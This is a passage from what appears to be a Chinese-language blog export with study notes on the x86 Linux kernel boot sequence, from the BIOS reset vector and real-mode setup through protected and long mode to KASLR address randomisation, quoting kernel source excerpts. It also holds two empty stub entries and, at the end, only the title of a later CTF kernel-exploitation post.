内存映射，打印信息</span><br><span class="line">//  🌰  0.000000] e820: BIOS-provided physical RAM map:</span><br><span class="line">// [    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable</span><br><span class="line">e820__memory_setup();</span><br><span class="line"></span><br><span class="line">// 复制 BIOS 磁盘设备信息</span><br><span class="line">copy_edd();</span><br><span class="line"></span><br><span class="line">// 内存描述符初始化 及 代码/数据/BSS 资源初始化</span><br><span class="line">setup_initial_init_mm(_text, _etext, _edata, (void *)_brk_end);</span><br><span class="line">code_resource.start = __pa_symbol(_text);</span><br><span class="line">code_resource.end = __pa_symbol(_etext)-1;</span><br><span class="line">rodata_resource.start = __pa_symbol(__start_rodata);</span><br><span class="line">rodata_resource.end = __pa_symbol(__end_rodata)-1;</span><br><span class="line">data_resource.start = __pa_symbol(_sdata);</span><br><span class="line">data_resource.end = __pa_symbol(_edata)-1;</span><br><span class="line">bss_resource.start = __pa_symbol(__bss_start);</span><br><span class="line">bss_resource.end = __pa_symbol(__bss_stop)-1;</span><br><span class="line"></span><br><span class="line">// 配置 NX</span><br><span class="line">x86_configure_nx();</span><br><span class="line"></span><br><span class="line">// 解析命令行并基于创建不同的服务，如 </span><br><span class="line">parse_early_param();</span><br><span class="line"></span><br><span class="line">//内存解析</span><br><span class="line">/* update the e820_saved too */</span><br><span class="line">e820_reserve_setup_data();</span><br><span class="line">finish_e820_parsing();</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">e820_add_kernel_range();</span><br><span class="line">trim_bios_range(void);</span><br><span class="line">max_pfn = e820_end_of_ram_pfn();</span><br><span class="line">early_reserve_e820_mpc_new();</span><br><span class="line"></span><br><span class="line">//DMI扫描，通过 Desktop Management Interface 获取信息</span><br><span class="line">dmi_setup();</span><br><span class="line"></span><br><span class="line">// 解析 SMP 配置</span><br><span class="line">find_smp_config();</span><br><span class="line"></span><br><span class="line">// 额外的早期内存初始化，主要用来分配页表缓冲区，放置在 brk 区域内</span><br><span class="line">early_alloc_pgt_buf();</span><br><span class="line"></span><br><span class="line">// 分配日志缓冲区</span><br><span class="line">setup_log_buf(1);</span><br><span class="line"></span><br><span class="line">// 为 DMA 分配区域</span><br><span class="line">dma_contiguous_reserve(max_pfn_mapped &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">// 初始化 sparse memory，用于 NUMA 系统将内存区域划分为不同的内存库</span><br><span class="line">x86_init.paging.pagetable_init();</span><br><span class="line"></span><br><span class="line">// 映射 vsyscall，为 vsyscall 映射内存空间，提供对于某些系统调用的快速访问</span><br><span class="line">map_vsyscall();</span><br><span class="line"></span><br><span class="line">// 获取 SMP 配置信息</span><br><span class="line">get_smp_config();</span><br></pre></td></tr></table></figure>
<p>回归 <code>main.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 解析命令行</span><br><span class="line">setup_command_line(command_line);</span><br><span class="line"></span><br><span class="line">// 获取可用CPU数量</span><br><span class="line">// 🌰 setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:1 nr_node_ids:1</span><br><span class="line">setup_nr_cpu_ids();</span><br><span class="line"></span><br><span class="line">// 为 percpu 设置内存区域</span><br><span class="line">setup_per_cpu_areas();</span><br><span class="line"></span><br><span class="line">// 准备 smp Boot cpu</span><br><span class="line">smp_prepare_boot_cpu();</span><br><span class="line"></span><br><span class="line">// 建立区域列表</span><br><span class="line">build_all_zonelists(NULL);</span><br><span class="line"></span><br><span class="line">// 虚拟文件系统早起初始化</span><br><span class="line">vfs_caches_init_early();</span><br><span class="line"></span><br><span class="line">// 内存管理器初始化</span><br><span class="line">mm_init();</span><br><span class="line"></span><br><span class="line">// 调度程序初始化</span><br><span class="line">sched_init();</span><br><span class="line"></span><br><span class="line">// 初始化基础树</span><br><span class="line">radix_tree_init();</span><br><span class="line"></span><br><span class="line">// RCU 初始化</span><br><span class="line">rcu_init();</span><br><span class="line"></span><br><span class="line">// 初始化跟踪子系统</span><br><span class="line">trace_init();</span><br><span class="line"></span><br><span class="line">// 初始化 中断处理子系统</span><br><span class="line">early_irq_init();</span><br><span class="line">init_IRQ();</span><br><span class="line">softirq_init();</span><br><span class="line"></span><br><span class="line">// 初始化时间子系统</span><br><span class="line">init_timers();</span><br><span class="line">hrtimers_init();</span><br><span class="line">timekeeping_init();</span><br><span class="line"></span><br><span class="line">// 启用 irq</span><br><span class="line">local_irq_enable();</span><br><span class="line"></span><br><span class="line">// 初始化 slab</span><br><span class="line">kmem_cache_init_late();</span><br><span class="line"></span><br><span class="line">// 初始化 命令行</span><br><span class="line">console_init();</span><br><span class="line"></span><br><span class="line">// pid hash table 初始化</span><br><span class="line">pid_idr_init();</span><br><span class="line"></span><br><span class="line">// 初始化 线程/栈 缓存</span><br><span class="line">thread_stack_cache_init();</span><br><span class="line"></span><br><span class="line">// 初始化 cred</span><br><span class="line">cred_init();</span><br><span class="line"></span><br><span class="line">// 为 task_struct 分配缓存</span><br><span class="line">fork_init();</span><br><span class="line"></span><br><span class="line">// 为 内存描述符分配缓存</span><br><span class="line">proc_caches_init();</span><br><span class="line"></span><br><span class="line">// 为 vfs 分配缓存</span><br><span class="line">vfs_caches_init();</span><br><span class="line"></span><br><span class="line">// 为 procfs 创建根目录</span><br><span class="line">proc_root_init();</span><br><span class="line"></span><br><span class="line">// 初始化 安全内容</span><br><span class="line">key_init();</span><br><span class="line">security_init();</span><br><span class="line"></span><br><span class="line">... 子系统</span><br><span class="line"></span><br><span class="line">// 剩余初始化</span><br><span class="line">arch_call_rest_init();</span><br><span class="line">    - rest_init</span><br><span class="line">        // 启动 RCU 调度程序</span><br><span class="line">        - rcu_scheduler_starting();</span><br><span class="line">        // 构建 init 进程和 kthreadd 线程</span><br><span class="line">        - pid = kernel_thread(kernel_init, NULL, CLONE_FS);</span><br><span class="line">        - pid = kernel_thread(kthreadd, NULL, CLONE_FS | CLONE_FILES);</span><br><span class="line">        // 获取 kthreadd tast_struct</span><br><span class="line">        - kthreadd_task = find_task_by_pid_ns(pid, &amp;init_pid_ns);</span><br><span class="line"></span><br><span class="line">        - 更新系统状态</span><br><span class="line">        system_state = SYSTEM_SCHEDULING;</span><br><span class="line"></span><br><span class="line">        - 正式启动</span><br></pre></td></tr></table></figure>
<p><strong>SMP Prepare</strong><br>此函数依旧是特定于体系架构</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 获取当前 CPU</span><br><span class="line">int me = smp_processor_id();</span><br><span class="line">// 为给定CPU重新加载 GDT</span><br><span class="line">switch_to_new_gdt(me);</span><br><span class="line"></span><br><span class="line">// 将 CPU 修改为在线</span><br><span class="line">cpumask_set_cpu(me, cpu_callout_mask);</span><br><span class="line">cpu_set_state_online(me);</span><br><span class="line">native_pv_lock_init();</span><br></pre></td></tr></table></figure>
<p><strong>建立区域列表</strong><br>此函数设置优先分配的区域顺序<br>Linux内核将物理内存分成 nodes，其结构为 pglist_data<br>每一个 node 被分成很多块，称之为 zones，结构为 zone</p>
<p>拥有以下类型：</p>
<ul>
<li>ZONE_DMA 0-16M</li>
<li>ZONE_DMA32 用于4G以下DMA区域的32位设备</li>
<li>ZONE_NORMAL 所有 4G RAM 区域 x86_64</li>
<li>ZONE_HIGHMEM x86_64 不存在</li>
<li>ZONE_MOVABLE 包含可移动页面区</li>
</ul>
<p><strong>RCU</strong><br>RCU read-copy-update，是Linux内核实现的一种可拓展的高性能同步机制，其专门为很少修改的数据结构而设计</p>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 之 开天辟地</title>
    <url>/2022/05/13/Linux-Kernel-%E4%B9%8B-%E5%BC%80%E5%A4%A9%E8%BE%9F%E5%9C%B0/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="从-CPU-开始"><a href="#从-CPU-开始" class="headerlink" title="从 CPU 开始"></a>从 CPU 开始</h2><h3 id="通电启动复位"><a href="#通电启动复位" class="headerlink" title="通电启动复位"></a>通电启动复位</h3><p>在 CPU 通电后，会对内置寄存器进行复位</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">IP          0xfff0</span><br><span class="line">CS selector 0xf000</span><br><span class="line">CS base     0xffff0000</span><br></pre></td></tr></table></figure>
<p>这也就意味着 <code>Phsical Address = CS * 16 + IP = 0xFFFFFFF0</code></p>
<p>此地称之为 <strong>复位向量</strong> 即 CPU 重置后期望执行的第一条语句的内存地址，可以看到他仅包含简单的跳转指令，可以理解为 <code>jump _start16bit - ( . + 2)</code>，即跳转到 BIOS</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">    .section &quot;.reset&quot;, &quot;ax&quot;, %progbits</span><br><span class="line">    .code16</span><br><span class="line">.globl    _start</span><br><span class="line">_start:</span><br><span class="line">    .byte  0xe9</span><br><span class="line">    .int   _start16bit - ( . + 2 )</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h3 id="BIOS-搜索引导程序"><a href="#BIOS-搜索引导程序" class="headerlink" title="BIOS 搜索引导程序"></a>BIOS 搜索引导程序</h3><p>BIOS即基本输入输出系统，它主要工作是根据记录的可引导设备列表进行搜索可引导程序</p>
<p>我们常见的可引导设备就是硬盘，对于硬盘，BIOS将会搜索其引导扇区，如果硬盘存在 MBR 分区，则引导扇区存储在第一个扇区的前 446 字节处，扇区的结尾是 <code>0x55</code> 和 <code>0xaa</code>，BIOS 通常是通过这两个魔术字节来判断设备是否可引导。</p>
<p>对于 Linux 来说有很多的引导程序，Linux 内核通过 Boot protocal 定义实现引导程序</p>
<p><strong>以 GRUB 2 为例</strong><br>常规来说，启动扇区的代码是 <code>boot.img</code>，通常仅占有 1 个扇区，做完必要的初始化后就跳转到 <code>GRUB 2 core image</code> 执行，对应的代码可以参照 <code>diskboot.img</code>，通常存储在引导扇区之后第一个可用分区之前，能够将引导程序的代码和文件加载到程序中，…，最后使用 GRUB <code>boot</code> 命令引导选择的操作系统</p>
<p>在内核被引导入内存后，内存使用情况如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">         | Protected-mode kernel  |</span><br><span class="line">100000   +------------------------+</span><br><span class="line">         | I/O memory hole        |</span><br><span class="line">0A0000   +------------------------+</span><br><span class="line">         | Reserved for BIOS      | Leave as much as possible unused</span><br><span class="line">         ~                        ~</span><br><span class="line">         | Command line           | (Can also be below the X+10000 mark)</span><br><span class="line">X+10000  +------------------------+</span><br><span class="line">         | Stack/heap             | For use by the kernel real-mode code.</span><br><span class="line">X+08000  +------------------------+</span><br><span class="line">         | Kernel setup           | The kernel real-mode code.</span><br><span class="line">         | Kernel boot sector     | The kernel legacy boot sector.</span><br><span class="line">       X +------------------------+</span><br><span class="line">         | Boot loader            | &lt;- Boot sector entry point 0x7C00</span><br><span class="line">001000   +------------------------+</span><br><span class="line">         | Reserved for MBR/BIOS  |</span><br><span class="line">000800   +------------------------+</span><br><span class="line">         | Typically used by MBR  |</span><br><span class="line">000600   +------------------------+</span><br><span class="line">         | BIOS use only          |</span><br><span class="line">000000   +------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="由内核发力"><a href="#由内核发力" class="headerlink" title="由内核发力"></a>由内核发力</h2><h3 id="内核设置"><a href="#内核设置" class="headerlink" title="内核设置"></a>内核设置</h3><p>此时内核已经被引导进入内存中，虽然控制权已经转交给内核，但是并未真正的运行起来，需要进行一系列的设置</p>
<p>内核设置代码的起点是 <code>/arch/x86/boot/header.S</code>，原先 kernel 会自带 bootloader 进行启动，但是现在仅输出错误信息</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	.global bootsect_start</span><br><span class="line">bootsect_start:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifdef CONFIG_EFI_STUB</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">&quot;MZ&quot;</span>, MS-DOS header</span></span><br><span class="line">	.word	MZ_MAGIC</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Normalize the start address</span></span><br><span class="line">	ljmp	$BOOTSEG, $start2</span><br><span class="line"></span><br><span class="line">start2:</span><br><span class="line">	movw	%cs, %ax</span><br><span class="line">	movw	%ax, %ds</span><br><span class="line">	movw	%ax, %es</span><br><span class="line">	movw	%ax, %ss</span><br><span class="line">	xorw	%sp, %sp</span><br><span class="line">	sti</span><br><span class="line">	cld</span><br><span class="line"></span><br><span class="line">	movw	$bugger_off_msg, %si</span><br><span class="line"></span><br><span class="line">bugger_off_msg:</span><br><span class="line">	.ascii	&quot;Use a boot loader.\r\n&quot;</span><br><span class="line">	.ascii	&quot;\n&quot;</span><br><span class="line">	.ascii	&quot;Remove disk and press any key to reboot...\r\n&quot;</span><br><span class="line">	.byte	0</span><br></pre></td></tr></table></figure>
<p>现在将会从 <code>_start</code> 开始</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">offset 512, entry point // 0x200 偏移处</span></span><br><span class="line"></span><br><span class="line">	.globl	_start</span><br><span class="line">_start:</span><br><span class="line">        .byte	0xeb		# short (2-byte) jump</span><br><span class="line">        .byte	start_of_setup-1f // 跳转到 setup 阶段</span><br><span class="line">1: // setup header 结构</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	.section &quot;.entrytext&quot;, &quot;ax&quot;</span><br><span class="line">start_of_setup:</span><br></pre></td></tr></table></figure>
<p>这里需要了解到，在从 <code>GRUB</code> 跳转到 <code>_start</code> 时，设置的代码如下，即将 CS 代码段偏移增加 <code>0x20</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">state.gs = state.fs = state.es = state.ds = state.ss = segment;</span><br><span class="line">state.cs = segment + 0x20;</span><br></pre></td></tr></table></figure>

<h3 id="start-of-setup"><a href="#start-of-setup" class="headerlink" title="start_of_setup"></a>start_of_setup</h3><p><strong>段寄存器设置</strong><br>首先对段寄存器进行设置，强制 ES 段与 DS 段相同</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Force %es = %ds</span></span><br><span class="line">	movw	%ds, %ax</span><br><span class="line">	movw	%ax, %es</span><br><span class="line">	cld</span><br></pre></td></tr></table></figure>
<p>随后对 SS 段进行设置，具体操作如下：</p>
<ul>
<li>首先判断 SS 段与 DS ES 段是否相同，并将 SP 寄存器放在 dx 寄存器内<ul>
<li>如果相同则跳转到 2f，对 dx 即 sp 寄存器进行对齐操作，<ul>
<li>如果失败则将 sp 设置为 <code>0xfffc</code></li>
<li>如果正确结束</li>
</ul>
</li>
<li>如果不相同则构造新的栈，首先将 <code>_end</code> 设置给 dx，并判断是否设置 <code>CAN_USE_HEAP</code><ul>
<li>如果设置，则将 heap_end_ptr 置于 dx 寄存器，加上 <code>STACK_SIZE</code></li>
<li>如果没有设置，则将 dx 直接加上 <code>STACK_SIZE</code><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	movw	%ss, %dx</span><br><span class="line">	cmpw	%ax, %dx	# %ds == %ss?</span><br><span class="line">	movw	%sp, %dx</span><br><span class="line">	je	2f		# -&gt; assume %sp is reasonably set</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Invalid %ss, make up a new stack</span></span><br><span class="line">	movw	$_end, %dx</span><br><span class="line">	testb	$CAN_USE_HEAP, loadflags</span><br><span class="line">	jz	1f</span><br><span class="line">	movw	heap_end_ptr, %dx</span><br><span class="line">1:	addw	$STACK_SIZE, %dx</span><br><span class="line">	jnc	2f</span><br><span class="line">	xorw	%dx, %dx	# Prevent wraparound</span><br><span class="line"></span><br><span class="line">2:	# Now %dx should point to the end of our stack space</span><br><span class="line">	andw	$~3, %dx	# dword align (might as well...)</span><br><span class="line">	jnz	3f</span><br><span class="line">	movw	$0xfffc, %dx	# Make sure we&#x27;re not zero</span><br><span class="line">3:	movw	%ax, %ss</span><br><span class="line">	movzwl	%dx, %esp	# Clear upper half of %esp</span><br><span class="line">	sti			# Now we should have a working stack</span><br></pre></td></tr></table></figure>
将 DS 段与 CS 段置为同值<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	pushw	%ds</span><br><span class="line">	pushw	$6f</span><br><span class="line">	lretw</span><br><span class="line">6:</span><br></pre></td></tr></table></figure>
此时，如果 SS &#x3D;&#x3D; DS，目前的堆栈情况为：<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132021604.png"><br>如果 SS !&#x3D; DS，且 设置 USE_HEAP，则堆栈情况为：<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132023418.png"><br>如果 SS !&#x3D; DS，且不设置 USE_HEAP，则堆栈情况为：<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132024069.png"></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>BSS 段设置</strong><br>BSS 段主要用来存放没有被初始化的静态变量，对于此段的内存，linux 将会对齐进行清零</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">movw    $__bss_start, %di</span><br><span class="line">movw    $_end+3, %cx</span><br><span class="line">xorl    %eax, %eax</span><br><span class="line">subw    %di, %cx</span><br><span class="line">shrw    $2, %cx</span><br><span class="line">rep; stosl</span><br></pre></td></tr></table></figure>
<p>代码执行完毕后，将对得到如下BSS段<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132027504.png"></p>
<p>紧接着就跳转到 <code>main</code> 函数执行 C 代码</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Jump to C code (should not <span class="built_in">return</span>)</span></span><br><span class="line">	calll	main</span><br></pre></td></tr></table></figure>

<h2 id="准备启动"><a href="#准备启动" class="headerlink" title="准备启动"></a>准备启动</h2><h3 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h3><p>首先简要介绍一下保护模式和实模式的区别，因为在64位操作系统之前，内核必须切换到保护模式才能运行</p>
<p>保护模式的主要改变：</p>
<ul>
<li>将实模式的20根地址线转换为32位，系统可以访问多达 4G 的地址空间</li>
<li>引入内存分页管理方法</li>
</ul>
<p>在保护模式中，内存段的大小和位置使用 <code>段描述符</code> 进行描述，通过段描述符可以知道段的属性和状态，段描述符的主要结构如下，每个描述符的长度是 64 位，均存储在 <code>全局描述符表 GDT</code> 中</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">31          24        19      16              7            0</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|             | |B| |A|       | |   | |0|E|W|A|            |</span><br><span class="line">| BASE 31:24  |G|/|L|V| LIMIT |P|DPL|S|  TYPE | BASE 23:16 | 4</span><br><span class="line">|             | |D| |L| 19:16 | |   | |1|C|R|A|            |</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|                             |                            |</span><br><span class="line">|        BASE 15:0            |       LIMIT 15:0           | 0</span><br><span class="line">|                             |                            |</span><br><span class="line">------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>全局描述符表 在内存中的位置不定，其地址保存在 <code>GDTR</code> 特殊寄存器中，汇编代码大概是 <code>lgdt gdt</code>，GDTR 是 48 位寄存器，基址 32 位，大小 16 位。</p>
<p>而此时所谓的段寄存器 DS SS ES 等存储的均是 <code>段选择子</code>，其结构如下，即 CPU 通过以下步骤找到物理地址：段选择子-&gt;段描述符-&gt;段基址+偏移</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">-----------------------------</span><br><span class="line">|       Index    | TI | RPL |</span><br><span class="line">-----------------------------</span><br><span class="line">GDT 段描述符索引号 ｜GDT or LDT ｜ 请求优先级</span><br></pre></td></tr></table></figure>

<p>从实模式进入保护模式，需要执行以下操作：</p>
<ul>
<li>禁止中断发生</li>
<li>使用命令将 GDT 装入 GDTR</li>
<li>设置 CR0 PE 位为 1，使寄存器进入保护模式</li>
<li>跳转执行保护模式代码</li>
</ul>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>可以提前看到，此处在实模式下内核基本配置完成后，对硬件的一些信息获取，如 CPU 内存 键盘<br><strong>copy_boot_params</strong><br>此处主要是将前面定义的 <code>struct setup_header hdr</code> 拷贝到 <code>boot params</code> 中<br><strong>console_init</strong><br>初始化命令行，通过分析 <code>earlyprintk</code>，对相应串口进行初始化<br><strong>init_heap</strong><br>在前面设置过程中对堆栈和BSS进行初始化后，内核需要初始化全局堆，即此函数得目标，主要流程是通过计算 <code>stack_end</code> 和 <code>heap_end</code> 对堆进行初始化<br><strong>validate_cpu</strong><br>此处对 CPU 的类型进行检查，我们只需要了解：</p>
<ul>
<li>如果 CPU 标志为 64 位，则设置 long mode</li>
<li>根据制造商的不同，设置不同的CPU选项</li>
</ul>
<p><strong>set_bios_mode</strong><br>告知 BIOS 我们将要运行在什么CPU模式下<br><strong>detect_memory</strong><br>内存侦测主要是得到当前内存的使用分布，通常使用多种编程接口<br><strong>keyboard_init</strong><br>通过 0x16 中断获取键盘状态并设置按键检测频率<br><strong>系统参数查询</strong><br>系统参数查询，这里主要有：</p>
<ul>
<li>ist</li>
<li>apm_bios</li>
<li>edd</li>
</ul>
<p><strong>set_video</strong><br>依旧是通过之前的 <code>setup hdr</code> 数据结构进行获取初始参数，通过对内存 heap 进行读写</p>
<p><strong>go_to_protected_mode</strong><br>此处将进入保护模式，我们主要关注：</p>
<ol>
<li>setup_idt 设置中断描述符表 <code>lidtl null_idt</code></li>
<li>setup_gdt 设置全局描述符表 <code>lgdtl gdt</code></li>
<li>protected_mode_jump 保护模式跳转</li>
</ol>
<p>保护模式下代码的第一步会重置所有段寄存器（CS 除外），将他们指向数据段，并将通用寄存器清零（eax 除外）</p>
<h2 id="过渡-64-位模式"><a href="#过渡-64-位模式" class="headerlink" title="过渡 64 位模式"></a>过渡 64 位模式</h2><p>在 x86 linux 内核引导协议中写到<br><code>当使用 bzImage 时，保护模式下内核被重定位至 0x100000 处</code></p>
<p><strong>32 位入口点</strong><br>源码位置：<code>/arch/x86/boot/compressed/head_64.S</code></p>
<p>为什么称之为 compressed，因为 <code>bzImage</code> 是由 <code>vmlinux + 头文件 + 内核启动代码</code> 通过 gzip 压缩得来，因此源码主要进行切换模式的准备工作，在进入长模式后再解压内核</p>
<p><strong>计算重定位地址</strong></p>
<p>在必要的时候计算解压缩之后的地址，默认的内核基地址由内核编译项 <code>CONFIG_PHYSICAL_START</code> 所确定，其默认值为 <code>0x1000000</code></p>
<p><strong>长模式</strong><br>长模式是 X86_64 的原生模式，为了切换，需要进行一下操作：</p>
<ul>
<li>启用 PAE</li>
<li>建立页表并将顶级页表地址放入 cr3 寄存器</li>
<li>启用 EFER.LME</li>
<li>启用分页 - 设置 <code>cr0</code> 寄存器的 <code>PG</code> 和 <code>PE</code> 启动分页</li>
</ul>
<p><strong>初期页表初始化</strong><br>Linux 内核使用 4 级页表，可以构建初始 4G 页表，映射 4G 内存</p>
<ul>
<li>4 级页映射表 - 1</li>
<li>页目录指针表 - 1</li>
<li>页目录表 - 4</li>
</ul>
<h2 id="内核解压缩-加载地址随机化"><a href="#内核解压缩-加载地址随机化" class="headerlink" title="内核解压缩 - 加载地址随机化"></a>内核解压缩 - 加载地址随机化</h2><p>源码入口：<code>arch/x86/boot/compressed/misc.c/extract_kernel() -&gt; choose_random_location</code></p>
<p>可以参考：<code>/Documentation/x86/x86_64/mm.rst</code><br>首先对一些配置的默认设置进行分析</p>
<ul>
<li>在默认情况下，如果 X86_64 开启 4 级页表，则页的默认偏移基址为 <code>0xffff888000000000</code>，页的对齐大小必须是处于 <code>0x200000</code> 到 <code>0x1000000，即</code> 2M 到 16M，且是 <code>0x200000</code> 的倍数</li>
<li>内核映射的基础地址为 <code>0xffffffff80000000</code>，如果启用 KASLR 则内核镜像大小为 1G，否则为 512M<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __PAGE_OFFSET_BASE_L5	_AC(0xff11000000000000, UL)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __PAGE_OFFSET_BASE_L4	_AC(0xffff888000000000, UL)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __START_KERNEL_map	_AC(0xffffffff80000000, UL)</span></span><br><span class="line"></span><br><span class="line">config PHYSICAL_START</span><br><span class="line">	hex &quot;Physical address where the kernel is loaded&quot; if (EXPERT || CRASH_DUMP)</span><br><span class="line">	default &quot;0x1000000&quot;</span><br><span class="line"></span><br><span class="line">config PHYSICAL_ALIGN</span><br><span class="line">	hex &quot;Alignment value to which kernel should be aligned&quot;</span><br><span class="line">	default &quot;0x200000&quot;</span><br><span class="line">	range 0x2000 0x1000000 if X86_32</span><br><span class="line">	range 0x200000 0x1000000 if X86_64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifdef CONFIG_RANDOMIZE_BASE</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define KERNEL_IMAGE_SIZE	(1024 * 1024 * 1024) // 1G</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define KERNEL_IMAGE_SIZE	(512 * 1024 * 1024) // 512M</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>接下来分析选取随机化的流程：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 判断是否传入 nokaslr 信号</span><br><span class="line">if (cmdline_find_option_bool(&quot;nokaslr&quot;)) &#123;</span><br><span class="line">    warn(&quot;KASLR disabled: &#x27;nokaslr&#x27; on cmdline.&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 对内存进行限制</span><br><span class="line">if (IS_ENABLED(CONFIG_X86_32))</span><br><span class="line">    mem_limit = KERNEL_IMAGE_SIZE;</span><br><span class="line">else</span><br><span class="line">    mem_limit = MAXMEM;</span><br><span class="line"></span><br><span class="line">// 记录非安全区域，在随机过程中进行规避</span><br><span class="line">mem_avoid_init(input, input_size, *output);</span><br><span class="line"></span><br><span class="line">// 物理地址随机化</span><br><span class="line">random_addr = find_random_phys_addr(min_addr, output_size);</span><br><span class="line"></span><br><span class="line">// 虚拟地址随机化</span><br><span class="line">random_addr = find_random_virt_addr(LOAD_PHYSICAL_ADDR, output_size);</span><br></pre></td></tr></table></figure>
<p>寻找随机物理地址和随机虚拟地址的大致流程如下：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 使用 efi 或 e820 进行搜索满足条件的分配区并记录在 slot_area 数组中</span><br><span class="line">if (!process_efi_entries(minimum, image_size))</span><br><span class="line">		process_e820_entries(minimum, image_size);</span><br><span class="line"></span><br><span class="line">// 随机获取 slot area</span><br><span class="line">slots_fetch_random();</span><br><span class="line">    // 使用 RDRAND / RDTSC / i8254 进行随机数获取</span><br><span class="line">    - slot = kaslr_get_random_long(&quot;Physical&quot;) % slot_max;</span><br><span class="line">    // 通过逐步减少的方式确定 slot</span><br><span class="line">	for (i = 0; i &lt; slot_area_index; i++) &#123;</span><br><span class="line">		if (slot &gt;= slot_areas[i].num) &#123;</span><br><span class="line">			slot -= slot_areas[i].num;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		return slot_areas[i].addr + ((u64)slot * CONFIG_PHYSICAL_ALIGN);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Command Line Guide - CLI</title>
    <url>/2022/05/13/Command-Line-Guide/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="CLI-安装"><a href="#CLI-安装" class="headerlink" title="CLI 安装"></a>CLI 安装</h1><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><h3 id="Extensions"><a href="#Extensions" class="headerlink" title="Extensions"></a>Extensions</h3>]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>Command</tag>
      </tags>
  </entry>
  <entry>
    <title>awesome-recommand</title>
    <url>/2022/05/13/awesome-recommand/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><h3 id="Book"><a href="#Book" class="headerlink" title="Book"></a>Book</h3><h3 id="Audio-x2F-Video"><a href="#Audio-x2F-Video" class="headerlink" title="Audio&#x2F;Video"></a>Audio&#x2F;Video</h3><h3 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h3><h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><h3 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h3><h2 id="Linux-Kernel-Pwn"><a href="#Linux-Kernel-Pwn" class="headerlink" title="Linux Kernel Pwn"></a>Linux Kernel Pwn</h2><h2 id="Command-Line"><a href="#Command-Line" class="headerlink" title="Command Line"></a>Command Line</h2>]]></content>
      <categories>
        <category>阅读笔记</category>
      </categories>
      <tags>
        <tag>推荐</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF linux kernel pwn 0 之 kernel bypass-smep</title>
    <url>/2022/05/12/CTF-linux-kernel-pwn-0-%E4%B9%8B-kernel-bypass-smep/</url>
